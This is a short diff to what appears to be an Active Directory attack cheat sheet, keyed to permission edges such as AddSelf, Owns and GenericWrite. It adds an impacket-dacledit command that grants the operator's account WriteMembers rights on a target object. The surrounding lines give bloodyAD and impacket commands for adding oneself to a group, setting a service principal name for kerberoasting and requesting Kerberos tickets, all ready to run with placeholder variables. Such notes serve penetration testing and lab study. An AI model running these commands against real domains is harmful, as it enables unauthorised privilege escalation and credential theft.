@@ -476,6 +476,9 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='
 +---------- AddSelf ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; export KRB5CCNAME='$USERNAME.ccache'
 
++---------- Owns ----------+
+impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
+
 +---------- GenericWrite ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
